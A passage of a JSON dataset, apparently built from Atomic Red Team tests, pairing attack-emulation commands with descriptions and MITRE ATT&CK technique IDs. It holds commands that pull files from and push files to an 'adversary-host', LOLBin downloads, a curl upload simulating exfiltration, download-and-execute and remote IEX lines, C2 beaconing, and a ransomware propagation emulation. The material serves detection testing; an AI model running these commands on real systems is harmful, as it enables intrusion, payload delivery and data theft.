        "Command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com\ncurl -s -A \"*<|>*\" -m3 www.google.com\n",
        "Description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1071.001",
        "Shell": "sh"
    },
    {
        "ID": 801,
        "Command": "rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files\n",
        "Description": "Utilize rsync to perform a remote file copy (push)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "sh"
    },
    {
        "ID": 802,
        "Command": "rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files\n",
        "Description": "Utilize rsync to perform a remote file copy (pull)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "sh"
    },
    {
        "ID": 803,
        "Command": "scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/\n",
        "Description": "Utilize scp to perform a remote file copy (push)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "sh"
    },
    {
        "ID": 804,
        "Command": "scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/\n",
        "Description": "Utilize scp to perform a remote file copy (pull)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "sh"
    },
    {
        "ID": 805,
        "Command": "sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'\n",
        "Description": "Utilize sftp to perform a remote file copy (push)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "bash"
    },
    {
        "ID": 806,
        "Command": "sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/\n",
        "Description": "Utilize sftp to perform a remote file copy (pull)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "sh"
    },
    {
        "ID": 807,
        "Command": "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt\n",
        "Description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 808,
        "Command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }\n",
        "Description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 809,
        "Command": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\Atomic-license.txt\n",
        "Description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 810,
        "Command": "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")\n",
        "Description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 811,
        "Command": "pushd \\\\localhost\\C$\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n",
        "Description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 812,
        "Command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n",
        "Description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 813,
        "Command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\\Atomic-license.txt\n",
        "Description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 814,
        "Command": "timeout --preserve-status 1 whois -h localhost -p 8443 \"Hello from Atomic Red Team test T1105\" > /tmp/T1105.whois.out\n",
        "Description": "Download a remote file using the whois utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "sh"
    },
    {
        "ID": 815,
        "Command": "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt\n",
        "Description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 816,
        "Command": "finger base64_filedata@localhost\n",
        "Description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 817,
        "Command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n& $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml\n",
        "Description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 818,
        "Command": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll\nC:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll\nC:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll\nC:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll\n",
        "Description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 819,
        "Command": "C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com\nC:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com\nC:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com\nC:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com\n",
        "Description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 820,
        "Command": "\"PathToAtomicsFolder\\T1105\\src\\T1105.bat\" 1>NUL \n",
        "Description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 821,
        "Command": "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}\nelse\n{echo $machine >> \"$offline_list\"}}\n",
        "Description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 822,
        "Command": "del %TEMP%\\PrintBrm.zip >nul 2>&1 \nC:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\  -f %TEMP%\\PrintBrm.zip -O FORCE\n",
        "Description": "Create a ZIP file from a folder in a remote drive\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 823,
        "Command": "del %TEMP%\\redcanary.cab >nul 2>&1\nC:\\Windows\\System32\\replace.exe \"PathToAtomicsFolder\\T1105\\src\\redcanary.cab\" %TEMP% /A\n",
        "Description": "Copy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 824,
        "Command": "del %TEMP%\\redcanary.cab >nul 2>&1\nC:\\Windows\\System32\\replace.exe \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab %TEMP% /A\n",
        "Description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 825,
        "Command": "certreq.exe -Post -config https://example.com c:\\windows\\win.ini %temp%\\Atomic-license.txt",
        "Description": "Use certreq to download a file from the web",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 826,
        "Command": "wscript.exe \"PathToAtomicsFolder\\T1105\\src\\T1105-download-file.vbs\"\n",
        "Description": "Use wscript to run a local VisualBasic file to download a remote file",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 827,
        "Command": "curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh\n",
        "Description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "sh"
    },
    {
        "ID": 828,
        "Command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\\Atomic-license.txt\n",
        "Description": "Use nimgrab.exe to download a file from the web. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 829,
        "Command": "powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt\n",
        "Description": "Use 'iwr' or \"Invoke-WebRequest\" -URI argument to download a file from the web. Note: without -URI also works in some versions.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 830,
        "Command": "mkdir \"c:\\Temp\"\ncd PathToAtomicsFolder\\T1105\\bin\\\nGUP.exe -unzipTo \"\" \"C:\\Temp\" \"Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6\"",
        "Description": "GUP is an open source signed binary used by Notepad++ for software updates, and can be used to download arbitrary files(.zip) from internet/github.\n[Reference](https://x.com/nas_bench/status/1535322182863179776?s=20)\nUpon execution, a sample zip file will be downloaded to C:\\Temp\\Sample folder",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 831,
        "Command": "nscurl -k \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\" -o \"license.txt\"",
        "Description": "Use nscurl to download and write a file/payload from the internet.\n-k = Disable certificate checking\n-o = Output destination\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "sh"
    },
    {
        "ID": 832,
        "Command": "sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\\T1105.zip",
        "Description": "One of the windows packages 'Sqlcmd.exe' can be abused to download malicious files from C2 servers\nThis Atomic will exhibit the similar behavior by downloading a sample zip file from src directory of this Technique folder via GitHub URL",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 833,
        "Command": "fsutil file createnew C:\\Temp\\T1105_scp.zip 1048576\necho y | PathToAtomicsFolder\\..\\ExternalPayloads\\pscp.exe -P 22 -pw atomic C:\\Temp\\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip\n",
        "Description": "Copy a staged file using PSCP.exe to a public target location.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "command_prompt"
    },
    {
        "ID": 834,
        "Command": "# Check if the folder exists, create it if it doesn't\n$folderPath = \"C:\\temp\"\nif (-Not (Test-Path -Path $folderPath)) {\n\\tNew-Item -Path $folderPath -ItemType Directory\n}\n\n# Create the file\n$filePath = Join-Path -Path $folderPath -ChildPath \"T1105.txt\"\nNew-Item -Path $filePath -ItemType File -Force\nWrite-Output \"File created: $filePath\"\n\n# Attack command\nscp.exe C:\\temp\\T1105.txt adversary@adversary-host:/tmp/\n",
        "Description": "This test simulates pushing files using SCP on a Windows environment.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 835,
        "Command": "scp.exe adversary@adversary-host:/tmp/T1105.txt C:\\temp\n",
        "Description": "This test simulates pulling files using SCP on a Windows environment.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 836,
        "Command": "# Check if the folder exists, create it if it doesn't\n$folderPath = \"C:\\temp\"\nif (-Not (Test-Path -Path $folderPath)) {\n\\tNew-Item -Path $folderPath -ItemType Directory\n}\n# Create the file\n$filePath = Join-Path -Path $folderPath -ChildPath \"T1105.txt\"\nNew-Item -Path $filePath -ItemType File -Force\nWrite-Output \"File created: $filePath\"\n# Attack command\necho \"put C:\\temp\\T1105.txt\" | sftp adversary@adversary-host:/tmp\n",
        "Description": "This test simulates pushing files using SFTP on a Windows environment.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 837,
        "Command": "sftp.exe adversary@adversary-host:/tmp/T1105.txt C:\\temp\n",
        "Description": "This test simulates pulling files using SFTP on a Windows environment.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 838,
        "Command": "if (-not (Test-Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\")) {\n\\tWrite-Host \"OneDriveStandaloneUpdater.exe not found at C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe. Test cannot continue.\"\n\\texit 1\n}\n\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Force | Out-Null\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateRingSettingURLFromOC\" -Value \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\" -Type String -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"ODSUUpdateXMLUrlFromOC\" -Value \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\" -Type String -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateXMLUrlFromOC\" -Value \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\" -Type String -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\" -Name \"UpdateOfficeConfigTimestamp\" -Value 99999999999 -Type QWord -Force\n\n# Run OneDrive Standalone Updater\n& \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\"\n",
        "Description": "Uses OneDrive Standalone Updater to download a file from a specified URL by setting up the required registry keys.\nThis technique can be used to download files without executing anomalous executables.\nReference: https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1105",
        "Shell": "powershell"
    },
    {
        "ID": 839,
        "Command": "chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002\n",
        "Description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "sh"
    },
    {
        "ID": 840,
        "Command": "chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002\n",
        "Description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "sh"
    },
    {
        "ID": 841,
        "Command": "chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002\n",
        "Description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "sh"
    },
    {
        "ID": 842,
        "Command": "chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002\n",
        "Description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "bash"
    },
    {
        "ID": 843,
        "Command": "chown root:root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml\n",
        "Description": "Changes a file or folder's ownership and group information using chown.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "bash"
    },
    {
        "ID": 844,
        "Command": "chown -R root:root /tmp/AtomicRedTeam/atomics/T1222.002\n",
        "Description": "Changes a file or folder's ownership and group information recursively using chown.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "bash"
    },
    {
        "ID": 845,
        "Command": "chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml\n",
        "Description": "Changes a file or folder's ownership only using chown.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "sh"
    },
    {
        "ID": 846,
        "Command": "chown -R root /tmp/AtomicRedTeam/atomics/T1222.002\n",
        "Description": "Changes a file or folder's ownership only recursively using chown.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "bash"
    },
    {
        "ID": 847,
        "Command": "chattr -i /var/spool/cron/root\n",
        "Description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "sh"
    },
    {
        "ID": 848,
        "Command": "touch /tmp/T1222.002.txt\nchflags simmutable /tmp/T1222.002.txt\nchflags nosimmutable /tmp/T1222.002.txt\n",
        "Description": "Remove's a file's `immutable` attribute using `chflags`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "sh"
    },
    {
        "ID": 849,
        "Command": "/tmp/T1222002 /tmp/ T1222002\n",
        "Description": "chmods a file using a c script\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "sh"
    },
    {
        "ID": 850,
        "Command": "/tmp/T1222002 /tmp/ T1222002\n",
        "Description": "chmods a file using a c script\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "sh"
    },
    {
        "ID": 851,
        "Command": "sudo /tmp/T1222002own PathToAtomicsFolder/T1222.002/src/chown.c\n",
        "Description": "chowns a file to root using a c script\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "sh"
    },
    {
        "ID": 852,
        "Command": "/tmp/T1222002own PathToAtomicsFolder/T1222.002/src/chown.c\n",
        "Description": "chowns a file to root using a c script\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222.002",
        "Shell": "sh"
    },
    {
        "ID": 853,
        "Command": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n",
        "Description": "Add data to clipboard to copy off or execute commands from.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1115",
        "Shell": "command_prompt"
    },
    {
        "ID": 854,
        "Command": "echo Get-Process | clip\nGet-Clipboard | iex\n",
        "Description": "Utilize PowerShell to echo a command to clipboard and execute it\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1115",
        "Shell": "powershell"
    },
    {
        "ID": 855,
        "Command": "echo ifconfig | pbcopy\n$(pbpaste)",
        "Description": "Echo a command to clipboard and execute it",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1115",
        "Shell": "bash"
    },
    {
        "ID": 856,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"\n",
        "Description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1115",
        "Shell": "powershell"
    },
    {
        "ID": 857,
        "Command": "apt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt\n",
        "Description": "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1115",
        "Shell": "sh"
    },
    {
        "ID": 858,
        "Command": "Start-Process powershell.exe -WindowStyle hidden calc.exe\n",
        "Description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.003",
        "Shell": "powershell"
    },
    {
        "ID": 859,
        "Command": "start \"\" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec\n",
        "Description": "The following Atomic Red Team test leverages the Chrome headless browser to access a mockbin site. Create your own Mockbin.org site and replace the BIN in the inputs.\nThe default Mockbin ID forwards to google.com and you may view the details here https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec/view.\nReference: https://cert.gov.ua/article/5702579\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 860,
        "Command": "conhost.exe --headless calc.exe\n",
        "Description": "Launch conhost.exe in \"headless\" mode, it means that no visible window will pop up on the victim's machine. \nThis could be a sign of \"conhost\" usage as a LOLBIN or potential process injection activity.\nconhost.exe can be used as proxy the execution of arbitrary commands\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.003",
        "Shell": "powershell"
    },
    {
        "ID": 861,
        "Command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n",
        "Description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 862,
        "Command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nStart-Process $file1 /S;\n",
        "Description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
